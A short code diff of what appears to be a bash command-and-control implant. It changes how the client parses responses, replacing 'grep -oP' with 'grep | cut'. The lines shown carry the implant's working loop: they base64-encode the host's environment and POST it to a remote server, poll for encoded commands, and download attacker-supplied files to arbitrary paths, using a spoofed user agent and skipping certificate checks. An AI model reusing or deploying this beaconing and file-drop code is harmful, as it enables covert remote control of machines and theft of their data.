@@ -56,7 +56,7 @@ while true; do
   env=$(GetEnv) ; getenv64=$(R64Encoder -t "$env")
   request1=$(curl -A "$cagent" -s -k -X POST "$server/api/info" -d "Info: $getenv64")
   response=$(curl -A "$cagent" -s -k "$server/api/token")
-  token=$(echo "$response" | grep -oP "Token: \K.*")
+  token=$(echo "$response" | grep "Token: " | cut -d ' ' -f2)
   invoke64=$(R64Decoder -t "$token") ; param="Debug"
 
   if [ -n "$invoke64" ]; then
@@ -68,7 +68,7 @@ while true; do
          file_path="${invoke64#upload }"
          file_path=$(echo $file_path | cut -d "!" -f 2)
          file_request=$(curl -A "$cagent" -s -k -X GET "$server/api/download")
-         file_content=$(echo "$file_request" | grep -oP "File: \K.*")
+         file_content=$(echo "$file_request" | grep "File: " | cut -d ' ' -f2)
          R64Decoder -t "$file_content" > "$file_path"
          continue
       fi
